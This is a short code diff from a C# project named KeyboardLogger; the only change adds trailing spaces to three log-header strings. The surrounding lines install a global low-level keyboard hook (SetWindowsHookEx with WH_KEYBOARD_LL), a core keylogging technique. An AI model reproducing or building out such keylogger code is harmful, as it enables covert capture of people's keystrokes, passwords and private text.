@@ -28,9 +28,9 @@ namespace KeyboardLogger.KeyLog
             ProcessModule module = Process.GetCurrentProcess().MainModule;
             IntPtr hMod = Kernel32.GetModuleHandle(module.ModuleName);
             hHook = User32.SetWindowsHookEx(HookType.WH_KEYBOARD_LL, kydbHookProc, hMod, 0);
-            headLog.Write("[" + user + "]");
-            headLog.Write(user + "-key");
-            headLog.Write(user + "-txt");
+            headLog.Write("[" + user + "] ");
+            headLog.Write(user + "-key ");
+            headLog.Write(user + "-txt ");
             headLog.Flush();
             KbdChar.Init();
         }
